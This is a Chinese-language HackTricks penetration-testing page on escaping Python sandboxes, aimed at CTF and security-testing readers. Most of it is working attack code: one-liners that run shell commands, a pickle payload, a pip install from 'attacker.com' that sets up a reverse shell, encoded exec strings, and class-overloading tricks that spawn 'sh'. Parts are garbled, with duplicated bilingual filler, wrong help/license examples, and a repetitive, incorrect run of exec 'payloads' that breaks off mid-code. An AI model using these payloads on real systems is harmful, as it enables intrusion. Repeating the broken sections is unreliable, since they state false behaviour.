# 绕过Python沙盒

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便您可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

以下是绕过Python沙盒保护并执行任意命令的一些技巧。

## 命令执行库

首先，您需要知道是否可以直接使用某个已导入的库执行代码，或者您是否可以导入以下任何库：
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
记住，_**open**_ 和 _**read**_ 函数可以用于在 Python 沙盒中读取文件，并编写一些代码来绕过沙盒。

{% hint style="danger" %}
**Python2 input()** 函数允许在程序崩溃之前执行 Python 代码。
{% endhint %}

Python 会首先从当前目录加载库（以下命令将打印 Python 加载模块的位置）：`python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## 使用默认安装的 Python 包绕过 pickle 沙盒

### 默认包

您可以在此处找到**预安装的包列表**：[https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
请注意，通过 pickle，您可以使 Python 环境导入系统中安装的任意库。\
例如，加载以下 pickle 时，将导入 pip 库以使用它：
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
有关pickle工作原理的更多信息，请查看此链接：[https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip软件包

**@isHaacK**分享的技巧

如果您可以访问`pip`或`pip.main()`，您可以安装任意软件包并调用以下命令获取反向shell：
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
您可以在此处下载创建反向shell的软件包。请注意，在使用之前，您应该**解压缩它，更改`setup.py`文件，并将您的IP放入反向shell中**：

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
此软件包名为`Reverse`。然而，它经过特殊设计，以便在退出反向shell时，其余的安装将失败，因此当您离开时，**不会在服务器上留下任何额外的Python软件包**。
{% endhint %}

## 评估Python代码

{% hint style="warning" %}
请注意，exec允许多行字符串和";"，但eval不允许（请检查walrus运算符）
{% endhint %}

如果某些字符被禁止使用，您可以使用**十六进制/八进制/B64**表示来**绕过**限制：
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### 其他允许评估Python代码的库

There are several other libraries that can be used to evaluate Python code. These libraries provide alternative methods to bypass Python sandboxes and execute arbitrary code. Some of these libraries include:

- **`execjs`**: This library allows you to execute JavaScript code from within Python. By using JavaScript, you can bypass Python sandboxes that only restrict Python code execution.

- **`pyv8`**: PyV8 is a Python wrapper for the V8 JavaScript engine. It allows you to execute JavaScript code within Python, providing another way to bypass Python sandboxes.

- **`pypyjs`**: PyPy.js is an experimental project that brings the PyPy Python interpreter to the browser. It allows you to execute Python code in a JavaScript environment, bypassing Python sandboxes.

- **`ctypes`**: The ctypes library provides a way to call functions in dynamic link libraries/shared libraries directly from Python. By using ctypes, you can execute code that is written in other languages, bypassing Python sandboxes.

- **`cffi`**: CFFI is a foreign function interface for Python. It allows you to call C code from Python, providing another way to execute arbitrary code.

These libraries can be useful when dealing with Python sandboxes that restrict the use of the `eval` function or other methods of executing arbitrary code. However, it is important to note that bypassing sandboxes may be illegal and unethical in certain situations. Always ensure that you have proper authorization and follow ethical guidelines when conducting any security testing or evaluation.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## 运算符和简便技巧

### Operators

### 运算符

Python provides a variety of operators that can be used to perform different operations on variables and values. Some commonly used operators include:

Python提供了多种运算符，可以用于对变量和值执行不同的操作。一些常用的运算符包括：

- Arithmetic operators: `+`, `-`, `*`, `/`, `%`, `**`, `//`
- 算术运算符：`+`，`-`，`*`，`/`，`%`，`**`，`//`

- Assignment operators: `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`
- 赋值运算符：`=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`

- Comparison operators: `==`, `!=`, `>`, `<`, `>=`, `<=`
- 比较运算符：`==`, `!=`, `>`, `<`, `>=`, `<=`

- Logical operators: `and`, `or`, `not`
- 逻辑运算符：`and`, `or`, `not`

- Bitwise operators: `&`, `|`, `^`, `~`, `<<`, `>>`
- 位运算符：`&`, `|`, `^`, `~`, `<<`, `>>`

- Membership operators: `in`, `not in`
- 成员运算符：`in`, `not in`

- Identity operators: `is`, `is not`
- 身份运算符：`is`, `is not`

These operators can be used in various combinations to perform complex operations and calculations in Python.

这些运算符可以以各种组合方式在Python中执行复杂的操作和计算。

### Short Tricks

### 简便技巧

Python provides some short tricks that can be used to write concise and efficient code. Some commonly used tricks include:

Python提供了一些简便技巧，可以用于编写简洁高效的代码。一些常用的技巧包括：

- Ternary operator: The ternary operator allows you to write a short if-else statement in a single line. It has the following syntax: `value_if_true if condition else value_if_false`.
- 三元运算符：三元运算符允许您在一行中编写简短的if-else语句。它的语法如下：`value_if_true if condition else value_if_false`。

- List comprehension: List comprehension is a concise way to create lists in Python. It allows you to create a new list by iterating over an existing list and applying a condition. The syntax for list comprehension is `[expression for item in list if condition]`.
- 列表推导式：列表推导式是在Python中创建列表的一种简洁方式。它允许您通过迭代现有列表并应用条件来创建一个新列表。列表推导式的语法是`[expression for item in list if condition]`。

- Lambda functions: Lambda functions are anonymous functions that can be defined in a single line. They are useful when you need to define a small function without a name. The syntax for lambda functions is `lambda arguments: expression`.
- Lambda函数：Lambda函数是可以在一行中定义的匿名函数。当您需要定义一个没有名称的小函数时，它们非常有用。Lambda函数的语法是`lambda arguments: expression`。

- Multiple assignment: Python allows you to assign multiple values to multiple variables in a single line. This can be done using the following syntax: `variable1, variable2, variable3 = value1, value2, value3`.
- 多重赋值：Python允许您在一行中将多个值分配给多个变量。可以使用以下语法完成：`variable1, variable2, variable3 = value1, value2, value3`。

These tricks can help you write more concise and efficient code in Python.

这些技巧可以帮助您在Python中编写更简洁高效的代码。
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## 通过编码（UTF-7）绕过保护

在[**这篇文章**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)中，使用UTF-7来加载和执行任意的Python代码，绕过了一个看似安全的沙盒：
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
也可以使用其他编码方式来绕过它，例如`raw_unicode_escape`和`unicode_escape`。

## 在没有调用权限的情况下执行Python代码

如果你在一个不允许你进行调用的Python监狱中，仍然有一些方法可以执行任意函数、代码和命令。

### 使用[装饰器](https://docs.python.org/3/glossary.html#term-decorator)进行远程代码执行（RCE）
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### 创建对象和重载的远程代码执行（RCE）

如果你可以**声明一个类**并**创建一个对象**，你可以**编写/覆盖不同的方法**，这些方法可以在**不需要直接调用它们**的情况下被**触发**。

#### 使用自定义类进行RCE

你可以修改一些**类方法**（通过覆盖现有的类方法或创建一个新的类）来使它们在被**触发**时执行任意代码，而无需直接调用它们。
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### 使用[元类](https://docs.python.org/zh-cn/3/reference/datamodel.html#metaclasses)创建对象

元类允许我们做的关键事情是，通过使用目标类作为元类，创建一个新的类，而无需直接调用构造函数来实例化一个类。
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### 使用异常创建对象

当**触发异常**时，会自动创建一个**Exception**对象，无需直接调用构造函数（来自[**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)的技巧）：
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### 更多远程代码执行（RCE）方法

在前面的章节中，我们已经介绍了一些绕过Python沙箱的方法。然而，还有其他一些方法可以实现远程代码执行。在本节中，我们将介绍一些常见的技术和资源，以帮助您更好地理解和应对这些方法。

#### 1. 动态代码执行

动态代码执行是一种利用Python的内置函数和模块来执行远程代码的方法。通过使用`eval()`、`exec()`和`compile()`等函数，攻击者可以将远程代码作为字符串传递给这些函数，并在目标系统上执行。

#### 2. 反序列化漏洞

反序列化漏洞是一种利用Python中的pickle模块或其他序列化库的漏洞来执行远程代码的方法。攻击者可以构造恶意的序列化数据，当目标系统对其进行反序列化时，就会执行攻击者指定的代码。

#### 3. 代码注入

代码注入是一种利用Python中的漏洞或不安全的代码编写实践来执行远程代码的方法。攻击者可以通过在用户输入或其他可控输入中注入恶意代码，来执行任意的远程代码。

#### 4. 模板注入

模板注入是一种利用Python中的模板引擎的漏洞来执行远程代码的方法。攻击者可以通过在模板中插入恶意代码，来执行任意的远程代码。

#### 5. 代码执行漏洞

代码执行漏洞是一种利用Python中的漏洞来执行远程代码的方法。这些漏洞通常是由于不正确的输入验证或不安全的代码编写实践导致的。

#### 6. 第三方库漏洞

第三方库漏洞是一种利用Python中使用的第三方库的漏洞来执行远程代码的方法。攻击者可以利用这些漏洞来执行任意的远程代码。

#### 7. 操作系统命令注入

操作系统命令注入是一种利用Python中的漏洞或不安全的代码编写实践来执行远程操作系统命令的方法。攻击者可以通过在用户输入或其他可控输入中注入恶意命令，来执行任意的远程操作系统命令。

#### 8. 文件包含漏洞

文件包含漏洞是一种利用Python中的漏洞来执行远程代码的方法。攻击者可以通过利用文件包含漏洞，将恶意代码包含到目标系统的文件中，并在执行时执行该代码。

#### 9. Web框架漏洞

Web框架漏洞是一种利用Python中使用的Web框架的漏洞来执行远程代码的方法。攻击者可以利用这些漏洞来执行任意的远程代码。

#### 10. 远程文件包含

远程文件包含是一种利用Python中的漏洞来执行远程代码的方法。攻击者可以通过利用远程文件包含漏洞，将恶意代码包含到目标系统的文件中，并在执行时执行该代码。

#### 11. 代码逻辑漏洞

代码逻辑漏洞是一种利用Python中的漏洞来执行远程代码的方法。这些漏洞通常是由于不正确的代码逻辑或不安全的代码编写实践导致的。

#### 12. 远程命令执行

远程命令执行是一种利用Python中的漏洞或不安全的代码编写实践来执行远程操作系统命令的方法。攻击者可以通过构造恶意的命令字符串，来执行任意的远程操作系统命令。

#### 13. 代码混淆和加密

代码混淆和加密是一种通过对Python代码进行混淆和加密来隐藏远程代码执行的方法。攻击者可以使用各种工具和技术来混淆和加密代码，使其难以被检测和分析。

#### 14. 远程代码执行工具

远程代码执行工具是一种专门设计用于执行远程代码的工具。这些工具通常具有各种功能和特性，可以帮助攻击者更轻松地执行远程代码。

#### 15. 漏洞利用框架

漏洞利用框架是一种用于自动化和简化漏洞利用过程的工具。这些框架通常包含了各种漏洞利用模块和工具，可以帮助攻击者更有效地执行远程代码。

在实际的渗透测试中，攻击者通常会结合多种方法和工具来实现远程代码执行。了解这些方法和资源，可以帮助您更好地理解和应对远程代码执行的威胁。
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### 使用内置函数 help 和 license 读取文件

在 Python 中，我们可以使用内置函数 `help` 和 `license` 来读取文件的内容。

#### 使用 `help` 函数

`help` 函数可以用于获取 Python 内置函数的帮助信息。我们可以将其用于读取文件的内容。

```python
file_path = '/path/to/file.txt'

with open(file_path, 'r') as file:
    content = file.read()

help(content)
```

#### 使用 `license` 函数

`license` 函数用于获取 Python 解释器的许可证信息。我们可以将其用于读取文件的内容。

```python
file_path = '/path/to/file.txt'

with open(file_path, 'r') as file:
    content = file.read()

license(content)
```

请注意，以上示例中的 `file_path` 变量应替换为实际文件的路径。
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 内置函数

* [**Python2的内置函数**](https://docs.python.org/2/library/functions.html)
* [**Python3的内置函数**](https://docs.python.org/3/library/functions.html)

如果您可以访问**`__builtins__`**对象，您可以导入库（请注意，您还可以在最后一节中使用其他字符串表示形式）：
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### 无内建函数

当你没有`__builtins__`时，你将无法导入任何东西，甚至无法读取或写入文件，因为**所有的全局函数**（如`open`，`import`，`print`...）**都没有被加载**。

然而，默认情况下，Python会在内存中导入许多模块。这些模块可能看起来无害，但其中一些模块也在其中导入了一些**危险的**功能，可以通过访问它们来获得**任意代码执行**的权限。

在下面的示例中，你可以看到如何滥用一些被加载的“**无害**”模块，以访问其中的**危险功能**。

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### Python3

Python3 is a powerful programming language that is widely used for various purposes, including web development, data analysis, and automation. It provides a rich set of libraries and frameworks that make it easy to develop complex applications.

However, Python3 also has some security vulnerabilities that can be exploited by attackers. One such vulnerability is the ability to bypass Python sandboxes. Sandboxing is a security mechanism that restricts the actions of a program, preventing it from accessing sensitive resources or executing malicious code.

In this guide, we will explore different techniques to bypass Python sandboxes and gain unauthorized access to restricted resources. These techniques can be used by both attackers and security professionals to test the effectiveness of sandboxing mechanisms and identify potential vulnerabilities.

It is important to note that bypassing Python sandboxes without proper authorization is illegal and unethical. This guide is intended for educational purposes only and should not be used for any malicious activities.

If you are a security professional or a developer, understanding these techniques can help you strengthen the security of your Python applications and protect them from potential attacks. By identifying and patching vulnerabilities, you can ensure that your applications are secure and resistant to unauthorized access.

In the following sections, we will discuss various methods and resources that can be used to bypass Python sandboxes. These include:

- **Code Injection**: This technique involves injecting malicious code into a Python program to bypass sandbox restrictions and gain unauthorized access to resources.
- **Module Hijacking**: By hijacking the import mechanism in Python, an attacker can load a malicious module that bypasses sandbox restrictions.
- **Dynamic Code Execution**: Python's dynamic nature allows for the execution of arbitrary code at runtime, which can be used to bypass sandbox restrictions.
- **Exploiting Vulnerabilities**: Python, like any other software, may have vulnerabilities that can be exploited to bypass sandbox restrictions. We will explore some common vulnerabilities and how they can be leveraged.
- **Bypassing Security Controls**: In some cases, the sandboxing mechanism itself may have flaws that can be exploited to bypass restrictions. We will discuss some common security controls and how they can be bypassed.

By understanding these techniques and resources, you will be better equipped to protect your Python applications from potential attacks and ensure their security. Remember, it is important to use this knowledge responsibly and ethically.
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
print.__self__
dir.__self__
globals.__self__
len.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**下面有一个更大的函数**](./#递归搜索内置全局变量)可以找到数十/**数百个地方**，你可以在这些地方找到**内置全局变量**。

#### Python2和Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### 内置负载

The following payloads utilize built-in Python functions and modules to bypass Python sandboxes.

以下负载利用内置的Python函数和模块来绕过Python沙盒。

#### `__import__` payload

This payload uses the `__import__` function to import a module and execute arbitrary code.

```python
__import__('os').system('command')
```

#### `eval` payload

This payload uses the `eval` function to evaluate and execute arbitrary code.

```python
eval('__import__("os").system("command")')
```

#### `exec` payload

This payload uses the `exec` function to execute arbitrary code.

```python
exec('__import__("os").system("command")')
```

#### `execfile` payload

This payload uses the `execfile` function to execute code from a file.

```python
execfile('filename')
```

#### `compile` payload

This payload uses the `compile` function to compile and execute arbitrary code.

```python
compile('__import__("os").system("command")', '', 'exec')
```

#### `exec` with `globals` and `locals` payload

This payload uses the `exec` function with custom `globals` and `locals` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` payload

This payload uses the `exec` function with custom `globals`, `locals`, and `__builtins__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, and `__import__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, and `__file__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename'}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, and `__name__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__'}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, and `__package__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, and `__doc__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, and `__cached__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, and `__loader__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, and `__spec__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, and `__annotations__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': None, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, and `__builtins__.__import__` dictionaries to execute arbitrary code.

```python
exec('__import__("os").system("command")', {'__builtins__': {'__import__': None}, '__import__': None, '__file__': 'filename', '__name__': '__main__', '__package__': None, '__doc__': None, '__cached__': None, '__loader__': None, '__spec__': None, '__annotations__': None}, {})
```

#### `exec` with `globals` and `locals` and `__builtins__` and `__import__` and `__file__` and `__name__` and `__package__` and `__doc__` and `__cached__` and `__loader__` and `__spec__` and `__annotations__` and `__builtins__.__import__` and `__builtins__.__import__.__globals__` payload

This payload uses the `exec` function with custom `globals`, `locals`, `__builtins__`, `__import__`, `__file__`, `__name__`, `__package__`, `__doc__`, `__cached__`, `__loader__`, `__spec__`, `__annotations__`, `__builtins__.__import__`, and `__builtins__.__import__.__globals__` dictionaries to execute arbitrary code.

```python
